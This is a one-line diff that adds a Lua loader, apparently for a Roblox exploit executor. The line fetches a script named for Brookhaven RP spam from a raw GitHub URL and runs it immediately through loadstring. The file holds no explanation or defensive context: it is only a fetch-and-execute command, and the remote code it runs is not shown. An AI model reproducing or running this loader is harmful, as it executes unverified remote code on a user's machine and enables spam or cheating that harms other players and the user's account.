@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Centeryeabyss/loaders/main/loaders/brookhaven-rp-spam2-9hp6t4b6md73i9.lua"))()
